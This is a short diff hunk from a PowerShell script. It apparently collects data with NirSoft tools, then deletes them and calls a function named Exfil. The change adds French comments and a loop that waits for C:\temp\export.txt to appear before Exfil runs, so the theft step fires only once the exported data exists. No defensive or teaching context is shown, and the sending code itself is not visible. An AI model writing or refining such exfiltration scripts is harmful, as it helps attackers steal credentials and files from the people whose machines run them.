@@ -125,5 +125,11 @@ function Del-Nirsoft-File {
   exit
 }
 
-# Call the Exfil function
+
+# Attendre la création de C:\temp\export.txt
+do {
+    Start-Sleep -Seconds 1
+} until (Test-Path "C:\temp\export.txt")
+
+# Appeler la fonction Exfil
 Exfil
